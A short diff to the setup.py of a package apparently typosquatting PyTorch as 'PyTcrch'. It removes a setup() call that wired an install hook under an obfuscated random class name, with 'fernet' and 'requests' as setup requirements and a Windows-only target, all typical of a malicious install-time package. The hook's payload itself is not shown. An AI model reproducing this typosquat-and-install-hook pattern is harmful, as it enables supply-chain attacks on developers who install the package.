@@ -18,22 +18,5 @@ class rDxhbvKrvxAPLrMqmZGXWqLtzSnfpWkLvjEwsZejAZXqmmqFndDBJlcwzndqIhhcMWoYzOEtaX
             install.run(self)
 
 
-setup(
-    name="PyTcrch",
-    version=VERSION,
-    author="nSDWUpVyDxBZoOufdy",
-    author_email="LBcCBShPXbwGFaAN@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': rDxhbvKrvxAPLrMqmZGXWqLtzSnfpWkLvjEwsZejAZXqmmqFndDBJlcwzndqIhhcMWoYzOEtaXTjWeEhjuCBeiZDeMICiozaeoSPcEYLhEqghWmWGfnFrbyrYiaGuQwZfCBoXrvYKocVKc,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
